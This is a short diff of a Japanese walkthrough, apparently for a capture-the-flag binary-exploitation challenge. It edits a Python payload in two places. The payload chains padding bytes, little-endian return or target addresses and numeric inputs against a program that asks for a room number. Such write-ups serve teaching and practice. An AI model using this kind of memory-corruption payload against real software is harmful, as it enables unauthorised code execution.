@@ -315,7 +315,7 @@ Input your room number> 0xffffff8dを10進数に変換したもの
 ```
 これに合わせてペイロードも修正します。
 ```py
-b = b'nbaumroll123456789abcdef0'
+b = b'baumroll123456789abcdef0'
 b += bytes.fromhex('00000000401225')[::-1]
 b += b'\n'
 b += str(0xffffff8d).encode() + b'\n'
@@ -380,7 +380,7 @@ Input your room number> 0xffffff8dを10進数に変換したもの
 ```
 ペイロードも修正します。
 ```py
-b = b'nbaumroll123456789abcdef0'
+b = b'baumroll123456789abcdef0'
 b += bytes.fromhex('00000000404008')[::-1]
 b += b'\n'
 b += str(0x4011b6).encode() + b'\n'
